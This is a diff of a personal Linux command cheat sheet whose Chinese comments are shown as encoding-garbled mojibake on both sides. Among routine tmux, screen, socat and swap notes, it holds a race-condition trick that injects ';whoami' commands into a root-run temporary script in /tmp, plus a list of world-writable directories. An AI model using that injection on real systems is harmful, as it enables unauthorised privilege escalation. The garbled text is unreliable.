-ÏÂÔØµØÖ·£ºhttp://mirror.bjtu.edu.cnglibc-2.14.tar.xz
+ï¼ˆå‚çœ‹ï¼šhttp://blog.csdn.net/cpplang/article/details/8462768ï¼‰
+ä¸‹è½½åœ°å€ï¼šhttp://mirror.bjtu.edu.cnglibc-2.14.tar.xz
 
-chattr +i file.txt --Ê¹ÎÄ¼ş²»±»ĞŞ¸Ä,rootÒ²²»ÄÜĞŞ¸Ä
-chattr -i file.txt --È¥µôÉÏÃæµÄ±êÖ¾
-lsattr²é¿´ÎÄ¼şÊôĞÔ
+chattr +i file.txt --ä½¿æ–‡ä»¶ä¸è¢«ä¿®æ”¹,rootä¹Ÿä¸èƒ½ä¿®æ”¹
+chattr -i file.txt --å»æ‰ä¸Šé¢çš„æ ‡å¿—
+lsattræŸ¥çœ‹æ–‡ä»¶å±æ€§
 
-²é¿´ÃüÁîÊ÷ĞÎ¹ØÏµ
+æŸ¥çœ‹å‘½ä»¤æ ‘å½¢å…³ç³»
 ps axjf
 
-²é¿´ÁÙÊ±ÎÄ¼şµÄ·½·¨£º
+æŸ¥çœ‹ä¸´æ—¶æ–‡ä»¶çš„æ–¹æ³•ï¼š
 while [ 1 ]; do cat /tmp/dbusertmpscript-3001-execsql-redis.sh >
 /tmp/watchme 2>>/dev/null; if [ -s /tmp/watchme ]; then break; fi;
 done; cat /tmp/watchme; echo; rm /tmp/watchme
 
-ÍùÁÙÊ±½Å±¾×¢ÈëÃüÁî
+å¾€ä¸´æ—¶è„šæœ¬æ³¨å…¥å‘½ä»¤
 while [ 1 ]; do cat /tmp/dbusertmpscript-3001-execsql-redis.sh
 >/tmp/watchme 2>>/dev/null; if [ -s /tmp/watchme ]; then echo
 ";whoami > /tmp/ioactive_flag;chmod 666 /tmp/ioactive_flag" >>
@@ -661,43 +661,43 @@ while [ 1 ]; do cat /tmp/dbusertmpscript-3001-execsql-redis.sh
 break; fi; done; sleep 1; cat /tmp/ioactive_flag
 
 
-screenÊ¹ÓÃ
-1¡¢Ö±½ÓÊäÈëscreenÆô¶¯Ò»¸öscreen´°¿Ú£¬ÒªÔİÍ£¿ÉÒÔÊäÈëctrl+a d,ÍË³öexit
-2¡¢screen -list ²é¿´ÓĞÄÄĞ©screen
-3¡¢screen -r xxxÇĞ»»µ½screen session
+screenä½¿ç”¨
+1ã€ç›´æ¥è¾“å…¥screenå¯åŠ¨ä¸€ä¸ªscreençª—å£ï¼Œè¦æš‚åœå¯ä»¥è¾“å…¥ctrl+a d,é€€å‡ºexit
+2ã€screen -list æŸ¥çœ‹æœ‰å“ªäº›screen
+3ã€screen -r xxxåˆ‡æ¢åˆ°screen session
 
-sshfs¹ÒÔØÔ¶³ÌÎÄ¼ş
+sshfsæŒ‚è½½è¿œç¨‹æ–‡ä»¶
 sshfs root@10.67.252.200:/opt/gcf /mnt
-fusermount -u /mnt --½â¹Ò
+fusermount -u /mnt --è§£æŒ‚
 
-shc¿ÉÒÔ½«shell×ª»¯³É¿ÉÖ´ĞĞÎÄ¼ş
+shcå¯ä»¥å°†shellè½¬åŒ–æˆå¯æ‰§è¡Œæ–‡ä»¶
 
-multitail¿ÉÍ¬Ê±tail¶à¸öÎÄ¼ş£¬¹¦ÄÜ±ÈtailÇ¿´ó
+multitailå¯åŒæ—¶tailå¤šä¸ªæ–‡ä»¶ï¼ŒåŠŸèƒ½æ¯”tailå¼ºå¤§
 http://www.oschina.net/p/multitail/similar_projects
 http://www.ubuntugeek.com/multitail-view-multiple-logfiles-windowed-on-console.html
---retry-all ²ÎÊı£ºÈç¹ûÎÄ¼ş±»É¾³ıÒ²¿ÉÒÔ¼ÌĞø
---mergeall ËùÓĞÎÄ¼şºÏ²¢Ò»¸öÎÄ¼ş
+--retry-all å‚æ•°ï¼šå¦‚æœæ–‡ä»¶è¢«åˆ é™¤ä¹Ÿå¯ä»¥ç»§ç»­
+--mergeall æ‰€æœ‰æ–‡ä»¶åˆå¹¶ä¸€ä¸ªæ–‡ä»¶
 
-tmux #¿ªÆôtmux
-tmux ls #ÁĞ³ö»á»°(tmux list-session )
-tmux attach #TmuxÖØĞÂÁ¬½Óµ½Ö®Ç°µÄ´°¿Ú¿ÉÊ¹ÓÃ
-tmux attach -t session #½øÈëÄ³¸ö»á»°
-tmux -r #Á¬½ÓÉÏ´Î¶Ï¿ªµÄsession
-tmux kill-session #¹Ø±ÕÉÏ´Îtmux´ò¿ª´°¿Ú
-tmux kill-server #¹Ø±ÕËùÓĞtmux´ò¿ª´°¿Ú
+tmux #å¼€å¯tmux
+tmux ls #åˆ—å‡ºä¼šè¯(tmux list-session )
+tmux attach #Tmuxé‡æ–°è¿æ¥åˆ°ä¹‹å‰çš„çª—å£å¯ä½¿ç”¨
+tmux attach -t session #è¿›å…¥æŸä¸ªä¼šè¯
+tmux -r #è¿æ¥ä¸Šæ¬¡æ–­å¼€çš„session
+tmux kill-session #å…³é—­ä¸Šæ¬¡tmuxæ‰“å¼€çª—å£
+tmux kill-server #å…³é—­æ‰€æœ‰tmuxæ‰“å¼€çª—å£
 http://blog.jobbole.com/87278/
 http://blog.jobbole.com/87584/
 
-°üº¬´óÁ¿ÄÚºË¼¶¹¤¾ß£¬°üÀ¨ÀàËÆextrace
+åŒ…å«å¤§é‡å†…æ ¸çº§å·¥å…·ï¼ŒåŒ…æ‹¬ç±»ä¼¼extrace
 https://github.com/brendangregg/perf-tools
 
-¹ıÂËÖØ¸´µÄÃüÁî
+è¿‡æ»¤é‡å¤çš„å‘½ä»¤
 extrace -d |grep -v /opt/gcf/temp |sh my.sh
-my.shµÄÄÚÈİÎª£º
+my.shçš„å†…å®¹ä¸ºï¼š
 #!/bin/sh
 if [ $# -gt 0 ];then
 exec 0<$1;
-#ÅĞ¶ÏÊÇ·ñ´«Èë²ÎÊı£ºÎÄ¼şÃû£¬Èç¹û´«Èë£¬½«¸ÃÎÄ¼ş°ó¶¨µ½±ê×¼ÊäÈë
+#åˆ¤æ–­æ˜¯å¦ä¼ å…¥å‚æ•°ï¼šæ–‡ä»¶åï¼Œå¦‚æœä¼ å…¥ï¼Œå°†è¯¥æ–‡ä»¶ç»‘å®šåˆ°æ ‡å‡†è¾“å…¥
 fi
 while read line
 do
@@ -719,23 +719,23 @@ else
 echo "$line" > /opt/gcf/temp/extrace_tmp2.txt
 fi
 done<&0;
-#Í¨¹ı±ê×¼ÊäÈëÑ­»·¶ÁÈ¡ÄÚÈİ
+#é€šè¿‡æ ‡å‡†è¾“å…¥å¾ªç¯è¯»å–å†…å®¹
 exec 0&-;
-#½â³ı±ê×¼ÊäÈë°ó¶¨
+#è§£é™¤æ ‡å‡†è¾“å…¥ç»‘å®š
 
-ĞÂ½¨Ò»¸öswap·ÖÇø
+æ–°å»ºä¸€ä¸ªswapåˆ†åŒº
 dd if=/dev/zero of=/home/swap-fs bs=1M count=512
 mkswap /home/swap-fs
 swapon /home/swap-fs
-³¤Ê±¼äÊ¹ÓÃĞ´Èë/etc/fstabÎÄ¼ş£¬ÄÚÈİ
+é•¿æ—¶é—´ä½¿ç”¨å†™å…¥/etc/fstabæ–‡ä»¶ï¼Œå†…å®¹
 /home/swap-fs swap swap defaults 0 0
 
 
 
-linux¸÷ÖÖ¹¤¾ßÔ´Âë£¬±ÈÈçbash
+linuxå„ç§å·¥å…·æºç ï¼Œæ¯”å¦‚bash
 https://ftp.gnu.org/gnu/
 
-Ä¿Â¼¶ÔÈÎÒâÓÃ»§¿ÉĞ´µÄÓĞ£º
+ç›®å½•å¯¹ä»»æ„ç”¨æˆ·å¯å†™çš„æœ‰ï¼š
 /dev/shm
 /var/tmp
 /tmp
@@ -747,39 +747,39 @@ https://ftp.gnu.org/gnu/
 /var/spool/mail
 /var/tmp/vi.recover
 
-help²é¿´ÄÚÖÃÃüÁîµÄ°ïÖú
+helpæŸ¥çœ‹å†…ç½®å‘½ä»¤çš„å¸®åŠ©
 help set
 
-ps afx --°´Ê÷ĞÎ×Ó½ø³ÌÕ¹Ê¾
+ps afx --æŒ‰æ ‘å½¢å­è¿›ç¨‹å±•ç¤º
 
-¿ÉÖ¸¶¨ËÑË÷Â·¾¶
+å¯æŒ‡å®šæœç´¢è·¯å¾„
 updatedb --localpaths='/opt/gcf/unjar/deploy' --output=/opt/gcf/locate.db
 locate -d /opt/gcf/locate.db Main.java
 
-locateÒª¿½±´µ½ÆäËû»úÆ÷£¬ĞèÒª¿½±´ÈçÏÂÎÄ¼ş(updatedbÊÇ½Å±¾£¬¿ÉÒÔ¸Ä½Å±¾ÀïÃæµÄÂ·¾¶)
+locateè¦æ‹·è´åˆ°å…¶ä»–æœºå™¨ï¼Œéœ€è¦æ‹·è´å¦‚ä¸‹æ–‡ä»¶(updatedbæ˜¯è„šæœ¬ï¼Œå¯ä»¥æ”¹è„šæœ¬é‡Œé¢çš„è·¯å¾„)
 /usr/bin/locate
 /usr/bin/updatedb
 /usr/lib64/find/bigram
 /usr/lib64/find/code
 /usr/lib64/find/frcode
 
-½¨Á¢Ò»¸öÎ±ÔìµÄhttp·şÎñ¶Ë
+å»ºç«‹ä¸€ä¸ªä¼ªé€ çš„httpæœåŠ¡ç«¯
 socat TCP-LISTEN:80,reuseaddr stdout
 
-±¾µØ¶Ë¿Ú×ª·¢£¨windows¿ÉÓÃ£©
+æœ¬åœ°ç«¯å£è½¬å‘ï¼ˆwindowså¯ç”¨ï¼‰
 socat tcp-listen:5656,fork tcp:localhost:1337
 
-socat windows°æ±¾
+socat windowsç‰ˆæœ¬
 https://github.com/StudioEtrange/socat-windows
 
-inotifywaitÖ´ĞĞ±¨¾ä±ú´íÎóµÄ½â¾ö°ì·¨
+inotifywaitæ‰§è¡ŒæŠ¥å¥æŸ„é”™è¯¯çš„è§£å†³åŠæ³•
 sysctl -w fs.inotify.max_user_watches="99999999"
 
-python websockt¿Í»§¶Ë
+python websocktå®¢æˆ·ç«¯
 https://pypi.python.org/pypi/websocket-client
 
-½âËøÓÃ»§
+è§£é”ç”¨æˆ·
 pam_tally2 -u root -r
-·ÖÀà£º¼¼Êõ·ÖÏí
-ÆÀÂÛ
-Ëµ³öÄãµÄ¹Ûµã£¬²ÎÓëÆÀÂÛ°É!
+åˆ†ç±»ï¼šæŠ€æœ¯åˆ†äº«
+è¯„è®º
+è¯´å‡ºä½ çš„è§‚ç‚¹ï¼Œå‚ä¸è¯„è®ºå§!
